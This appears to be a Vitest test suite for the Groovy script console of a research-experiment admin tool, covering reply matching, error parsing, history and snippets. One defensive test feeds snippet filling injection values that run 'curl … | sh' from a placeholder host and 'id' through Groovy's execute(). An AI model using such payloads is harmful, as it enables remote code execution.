import { describe, it, expect, vi, beforeEach } from 'vitest'
import { defineComponent, h, nextTick } from 'vue'
import { mount, flushPromises } from '@vue/test-utils'
import { EditorView } from '@codemirror/view'
import { EditorState } from '@codemirror/state'

// The store as the console sees it: a reactive admin with an output log, and actions that log
// what was run (runScript writes the script as an "input" line, like the real store).
vi.mock('@/store/admin', async () => {
  const { reactive, ref, computed } = await import('vue')
  let seq = 100
  const admin = reactive({
    email: 'r@lab.org',
    user: { email: 'r@lab.org', currentScript: 'g.V.count()', experiments: [], defaultLanguage: null } as any,
    experiment: { id: 1, name: 'Trust game', fileMode: false } as any,
    instance: null as any,
    engine: 'ready',
    output: [] as any[],
  })
  const push = (kind: string, text: string, source?: string) => { admin.output.push({ id: ++seq, kind, text, source, at: Date.now() }) }
  const actions = {
    runScript: vi.fn((script: string) => push('input', script)),
    runStep: vi.fn(),
    refresh: vi.fn(() => Promise.resolve(null)),
    markEngineStale: vi.fn(),
    reloadEngine: vi.fn(),
    selectExperiment: vi.fn(),
  }
  return {
    admin,
    actions,
    __push: push,
    running: computed(() => false),
    connectionState: ref('open'),
    graph: { nodes: new Map([['3', { id: '3', data: {} }], ['_1', { id: '_1', data: {} }], ['8', { id: '8', data: {} }]]), version: ref(0) },
  }
})

import * as store from '@/store/admin'

// Node's own (file-less) localStorage shadows jsdom's here; use a plain in-memory one.
const memory = new Map<string, string>()
vi.stubGlobal('localStorage', {
  getItem: (k: string) => memory.has(k) ? memory.get(k)! : null,
  setItem: (k: string, v: string) => { memory.set(k, String(v)) },
  removeItem: (k: string) => { memory.delete(k) },
  clear: () => memory.clear(),
})
import { echoPrefix, expectReply, lastOutputId, matchReply, splitValues, __resetReplies } from '../src/pages/console/engineReplies'
import { parseGroovyError, humanType } from '../src/pages/console/groovyError'
import {
  addToHistory, consoleState, initialBuffer, markHistory, runConsoleScript, sanitizeHistory, searchHistory, seedConsole,
  HISTORY_CAP, type HistoryItem,
} from '../src/pages/console/consoleState'
import { SNIPPETS, SNIPPET_GROUPS, fillSnippet, pickIds, searchSnippets } from '../src/pages/console/snippets'
import { insertBlock, selectionOf, goToLine } from '../src/pages/console/editorView'
import ConsolePage from '../src/pages/console/ConsolePage.vue'

const admin = store.admin as any
const actions = store.actions as any
const push = (store as any).__push as (kind: string, text: string, source?: string) => void

beforeEach(() => {
  __resetReplies()
  vi.clearAllMocks()
})

describe('engine replies', () => {
  it('reads the values out of a success frame for its own script', () => {
    expect(splitValues('g.V.count()\n\n==>3', 'g.V.count()')).toEqual(['3'])
    expect(splitValues('g.V.id\n\n==>1\n==>2\n==>_1', '  g.V.id\n')).toEqual(['1', '2', '_1'])
    // a null result leaves nothing after ==>
    expect(splitValues('x = 1; null\n\n==>', 'x = 1; null')).toEqual([])
    expect(splitValues('g.E.count()\n\n==>4', 'g.V.count()')).toBeNull()
    expect(echoPrefix('  a\n')).toBe('a\n\n==>')
  })

  it('matches a success by its echo and an error to the oldest waiting script', () => {
    const waiting = [{ script: 'a()', afterId: 10 }, { script: 'b()', afterId: 11 }]
    expect(matchReply(waiting, { id: 12, kind: 'output', text: 'b()\n\n==>2' })).toBe(1)
    expect(matchReply(waiting, { id: 12, kind: 'output', text: 'onJoinStep.start("p1")\n\n==>' })).toBe(-1)
    expect(matchReply(waiting, { id: 12, kind: 'error', text: 'Caught error: boom' })).toBe(0)
    // nothing that came before the script was sent
    expect(matchReply(waiting, { id: 9, kind: 'error', text: 'Caught error: old' })).toBe(-1)
    expect(matchReply(waiting, { id: 13, kind: 'info', text: 'x' })).toBe(-1)
  })

  it('never takes the refusal of another request as the answer', () => {
    const waiting = [{ script: 'a()', afterId: 10 }]
    for (const source of ['LaunchGame', 'DeleteInstance', 'SelectExperiment', 'OnJoinStep', 'OnLeaveStep']) {
      expect(matchReply(waiting, { id: 12, kind: 'error', text: 'Caught error: not mine', source })).toBe(-1)
    }
    // a refused SendScript, or a RunStep (which the server names SendStep), is still an answer
    expect(matchReply(waiting, { id: 12, kind: 'error', text: 'You are not signed in.', source: 'SendScript' })).toBe(0)
    expect(matchReply(waiting, { id: 12, kind: 'error', text: 'Something went wrong', source: 'SendStep' })).toBe(0)
  })

  it('waits past an unrelated error for its own answer', async () => {
    push('input', 'g.V.count()')
    const p = expectReply('g.V.count()', lastOutputId())
    push('error', 'Could not delete the session.', 'DeleteInstance')
    push('output', 'g.V.count()\n\n==>7')
    await nextTick()
    expect(await p).toMatchObject({ ok: true, values: ['7'], error: null })
  })

  it('resolves with the answer as it arrives in the output', async () => {
    push('input', 'g.V.count()')
    const p = expectReply('g.V.count()', lastOutputId())
    push('output', 'onJoinStep.start("9")\n\n==>')
    push('output', 'g.V.count()\n\n==>5')
    await nextTick()
    const r = await p
    expect(r).toMatchObject({ ok: true, values: ['5'], error: null })
  })

  it('gives up after the timeout', async () => {
    vi.useFakeTimers()
    const p = expectReply('slow()', lastOutputId(), 1000)
    vi.advanceTimersByTime(1001)
    expect(await p).toBeNull()
    vi.useRealTimers()
  })
})

describe('engine errors', () => {
  it('explains an unknown name and finds the line in the script that was run', () => {
    const e = parseGroovyError('Caught error: ScriptException: groovy.lang.MissingPropertyException: No such property: foo for class: Script12\n  at Script5.groovy:9\n  at graph.groovy:120\n  at Script12.groovy:3')
    expect(e.type).toBe('MissingPropertyException')
    expect(e.title).toBe('Unknown name “foo”')
    expect(e.message).toBe('No such property: foo for class: Script12')
    expect(e.places[0]).toEqual({ file: 'Script12.groovy', line: 3, kind: 'own' })
    expect(e.places.map(p => p.kind)).toEqual(['own', 'library', 'other'])
  })

  it('reads a syntax error with its line and column', () => {
    const e = parseGroovyError('Caught error: ScriptException: org.codehaus.groovy.control.MultipleCompilationErrorsException: startup failed:\nScript7.groovy: 2: unexpected token: ) @ line 2, column 12.\n   g.V.count())\n              ^\n\n1 error\n')
    expect(e.title).toBe('Syntax error')
    expect(e.message).toBe('unexpected token: )')
    expect(e.places[0]).toEqual({ file: 'Script7.groovy', line: 2, column: 12, kind: 'own' })
  })

  it('says plainly that the game already started', () => {
    const e = parseGroovyError('Caught error: initStep started already')
    expect(e.title).toBe('The game has already started')
    expect(e.hint).toMatch(/once per session/)
    expect(e.places).toEqual([])
  })

  it('passes Breadboard\'s own refusals through as they are written', () => {
    const e = parseGroovyError('Caught error: ScriptException: java.lang.IllegalStateException: They are already connected.\n  at edge_edits.groovy:108\n  at Script30.groovy:1')
    expect(e.title).toBe('They are already connected.')
    expect(e.places[0]).toMatchObject({ file: 'Script30.groovy', kind: 'own' })
    expect(e.places[1]).toMatchObject({ file: 'edge_edits.groovy', kind: 'library' })
  })

  it('copes with a bare exception and odd input', () => {
    expect(parseGroovyError('Caught error: NullPointerException').title).toBe('Something was empty (null)')
    expect(parseGroovyError('').title).toBe('The script failed')
    expect(humanType('NumberFormatException')).toBe('Number format exception')
  })
})

describe('history and the buffer', () => {
  it('keeps the newest run on top and counts repeats once', () => {
    let list: HistoryItem[] = []
    list = addToHistory(list, 'a()', 1)
    list = addToHistory(list, 'b()', 2)
    list = addToHistory(list, ' a() ', 3)
    expect(list.map(h => h.script)).toEqual([' a() ', 'b()'])
    expect(list[0].count).toBe(2)
    markHistory(list, 'a()', false)
    expect(list[0].ok).toBe(false)
    expect(searchHistory(list, 'B(')).toHaveLength(1)
  })

  it('caps the history', () => {
    let list: HistoryItem[] = []
    for (let i = 0; i < HISTORY_CAP + 20; i++) list = addToHistory(list, `s${i}()`, i)
    expect(list).toHaveLength(HISTORY_CAP)
    expect(list[0].script).toBe(`s${HISTORY_CAP + 19}()`)
  })

  it('drops broken entries read back from storage', () => {
    expect(sanitizeHistory('nope')).toEqual([])
    expect(sanitizeHistory([{ script: 'x()', at: 5, count: 2, ok: true }, { script: '' }, null, { at: 1 }]))
      .toEqual([{ script: 'x()', at: 5, count: 2, ok: true }])
  })

  it('starts from this browser\'s draft, else the server\'s copy', () => {
    expect(initialBuffer('mine', 'server')).toBe('mine')
    expect(initialBuffer('', 'server')).toBe('')
    expect(initialBuffer(null, 'server')).toBe('server')
    expect(initialBuffer(null, undefined)).toBe('')
  })

  it('seeds once per account and is never replaced afterwards', () => {
    localStorage.setItem('bb-console-draft:a@x.org', 'draft()')
    seedConsole('a@x.org', 'server()')
    expect(consoleState.buffer).toBe('draft()')
    consoleState.buffer = 'typing…'
    seedConsole('a@x.org', 'pushed()')
    expect(consoleState.buffer).toBe('typing…')
    seedConsole('b@x.org', 'theirs()')
    expect(consoleState.buffer).toBe('theirs()')
  })

  it('runs a script and records the engine\'s answer and the history', async () => {
    seedConsole('run@x.org', '')
    const run = runConsoleScript('g.V.count()', { label: 'Script', fromLine: 1 })
    expect(actions.runScript).toHaveBeenCalledWith('g.V.count()')
    expect(run.status).toBe('pending')
    push('error', 'Caught error: ScriptException: groovy.lang.MissingPropertyException: No such property: g for class: Script3\n  at Script3.groovy:1')
    await nextTick()
    await flushPromises()
    expect(run.status).toBe('error')
    expect(run.error).toMatch(/No such property/)
    expect(consoleState.history[0]).toMatchObject({ script: 'g.V.count()', ok: false })
  })
})

describe('snippets', () => {
  it('only offers commands from the known groups, with code', () => {
    for (const s of SNIPPETS) {
      expect(SNIPPET_GROUPS).toContain(s.group)
      expect(s.code.trim()).not.toBe('')
      expect(s.text.trim()).not.toBe('')
    }
    expect(new Set(SNIPPETS.map(s => s.id)).size).toBe(SNIPPETS.length)
  })

  it('fills in real player ids, people first', () => {
    expect(pickIds(['_1', '3', '8'])).toEqual(['3', '8'])
    expect(pickIds(['_1'])).toEqual(['_1', '2'])
    expect(pickIds([])).toEqual(['1', '2'])
    expect(fillSnippet('edgeEdits.adminEdit("add", {p1}, {p2})', ['3', 'a"b'])).toBe('edgeEdits.adminEdit("add", \'3\', \'a"b\')')
  })

  // Splits Groovy source into the text outside single-quoted strings and the decoded strings.
  function lexSingleQuoted (src: string) {
    let outside = ''
    const literals: string[] = []
    const escapes: Record<string, string> = { n: '\n', r: '\r', '\\': '\\', "'": "'" }
    for (let i = 0; i < src.length; i++) {
      if (src[i] !== "'") { outside += src[i]; continue }
      let lit = ''
      for (i++; i < src.length && src[i] !== "'"; i++) {
        if (src[i] === '\n' || src[i] === '\r') throw new Error('raw line break inside a string')
        if (src[i] === '\\') { i++; lit += escapes[src[i]] ?? (() => { throw new Error('unknown escape \\' + src[i]) })() } else lit += src[i]
      }
      if (i >= src.length) throw new Error('unterminated string')
      literals.push(lit)
    }
    return { outside, literals }
  }

  it('puts participant-chosen ids in single-quoted strings, so ${…} never runs', () => {
    const evil = `\${'curl -s http://x/y.sh|sh'.execute()}'"\\\n\r{p2}$x`
    const other = `'+\${'id'.execute()}+'`
    for (const s of SNIPPETS.filter(s => s.code.includes('{p1}'))) {
      expect(s.code).not.toMatch(/"\{p[12]\}"/)
      const out = fillSnippet(s.code, [evil, other])
      const { outside, literals } = lexSingleQuoted(out)
      expect(outside).not.toContain('${')
      expect(outside).not.toContain('execute')
      expect(literals).toContain(evil)
      if (s.code.includes('{p2}')) expect(literals).toContain(other)
    }
    expect(fillSnippet('g.getVertex({p1}).map()', [`\${'x'.execute()}`, '2'])).toBe(`g.getVertex('\${\\'x\\'.execute()}').map()`)
  })

  it('searches titles, explanations and code', () => {
    expect(searchSnippets(SNIPPETS, 'adminEdit').map(s => s.id)).toEqual(['tie-add', 'tie-remove'])
    expect(searchSnippets(SNIPPETS, '').length).toBe(SNIPPETS.length)
  })
})

describe('editor helpers', () => {
  function view (doc: string, anchor: number, head = anchor) {
    const v = new EditorView({ state: EditorState.create({ doc, selection: { anchor, head } }), parent: document.body })
    return v
  }

  it('reports the selected lines', () => {
    const v = view('a\nb\nc\nd', 2, 6)
    expect(selectionOf(v)).toEqual({ text: 'b\nc\n', fromLine: 2, toLine: 3, empty: false })
    v.destroy()
  })

  it('inserts a command on its own line and selects it', () => {
    const v = view('g.V.count()', 3)
    insertBlock(v, 'g.E.count()')
    expect(v.state.doc.toString()).toBe('g.V.count()\ng.E.count()')
    expect(selectionOf(v).text).toBe('g.E.count()')
    v.destroy()
  })

  it('never replaces a selection: the command goes on the line after it', () => {
    const v = view('a()\nb()', 0, 3)
    insertBlock(v, 'x()')
    expect(v.state.doc.toString()).toBe('a()\nx()\nb()')
    expect(selectionOf(v)).toMatchObject({ text: 'x()', fromLine: 2 })
    v.destroy()
  })

  it('uses an empty line as it is', () => {
    const v = view('a\n\nb', 2)
    insertBlock(v, 'x()')
    expect(v.state.doc.toString()).toBe('a\nx()\nb')
    goToLine(v, 3)
    expect(selectionOf(v)).toMatchObject({ fromLine: 3, text: 'b' })
    v.destroy()
  })
})

describe('ConsolePage', () => {
  const CodeStub = defineComponent({
    name: 'BCodeEditor',
    props: ['modelValue', 'onRun', 'onSave', 'language', 'fill', 'ariaLabel', 'placeholder', 'readonly'],
    emits: ['update:modelValue'],
    setup (props, { emit, expose }) {
      expose({ focus: () => {}, selection: () => '', insert: () => {} })
      return () => h('textarea', { class: 'code-stub', value: props.modelValue, onInput: (e: any) => emit('update:modelValue', e.target.value) })
    },
  })

  it('keeps its own buffer when the server pushes a different currentScript, and runs it', async () => {
    // the page seeds for the signed-in account (admin.email)
    seedConsole('r@lab.org', 'server()')
    consoleState.buffer = 'g.V.count()'
    const w = mount(ConsolePage, { global: { stubs: { BCodeEditor: CodeStub } } })
    admin.user = { ...admin.user, currentScript: 'something else' }
    await nextTick()
    expect((w.find('textarea.code-stub').element as HTMLTextAreaElement).value).toBe('g.V.count()')

    const run = w.findAll('button').find(b => b.text() === 'Run script')!
    await run.trigger('click')
    expect(actions.runScript).toHaveBeenCalledWith('g.V.count()')
    push('output', 'g.V.count()\n\n==>3')
    await nextTick()
    await flushPromises()
    expect(w.text()).toContain('Results')
    expect(w.find('.run.is-ok').exists()).toBe(true)
    expect(w.find('.run__value').text()).toBe('3')
    w.unmount()
  })

  it('does not run an empty editor', async () => {
    seedConsole('r@lab.org', '')
    consoleState.buffer = '   '
    const w = mount(ConsolePage, { global: { stubs: { BCodeEditor: CodeStub } } })
    const run = w.findAll('button').find(b => b.text() === 'Run script')!
    expect(run.attributes('disabled')).toBeDefined()
    w.unmount()
  })
})
